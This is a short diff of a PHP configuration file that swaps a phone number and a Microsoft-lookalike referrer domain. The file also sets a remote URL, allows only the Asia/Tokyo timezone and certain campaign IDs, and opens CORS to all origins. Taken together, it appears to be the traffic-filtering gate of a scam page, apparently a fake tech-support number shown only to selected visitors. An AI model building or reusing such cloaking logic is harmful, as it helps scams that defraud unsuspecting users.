@@ -1,12 +1,12 @@
 <?php
-$number = '0101-55128-81974';
+$number = '0101-55128-81134';
 $dynamic_url = "https://onrender-3brc.onrender.com";
 #$dynamic_url = "http://127.0.0.1:8080";
 
 
 $allowed_timezones = ['Asia/Tokyo'];
 $allowed_campaign_ids = ['12345', '67890'];
-$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space','https://sunaloomblog.space', 'https://microsoftx1.onrender.com'];
+$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space','https://sunaloomblog.space', 'https://microsoftx2.onrender.com'];
 
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
